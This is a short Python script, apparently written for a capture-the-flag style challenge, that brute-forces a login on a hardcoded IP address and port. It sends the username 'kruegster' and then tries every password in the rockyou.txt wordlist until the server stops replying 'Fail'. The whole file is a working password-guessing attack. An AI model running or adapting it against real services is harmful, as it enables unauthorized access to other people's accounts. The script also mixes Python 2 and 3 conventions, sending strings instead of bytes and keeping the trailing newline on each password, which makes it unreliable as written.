import socket

host = "142.93.117.193" 
port = 1337 # Port here
wordlist = open("rockyou.txt", "r") # Point to wordlist file

def brute_force():
    count = 1

    for line in wordlist:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        res = s.recv(1024)
        s.send("kruegster" + "\n")

        res = s.recv(1024)
        s.send(line + "\n")
        
        print(line)

        if (not(s.recv(1024) == "Fail\n")):
            print("Password: " + line)
            break

   
    
if __name__ == '__main__':
    brute_force()
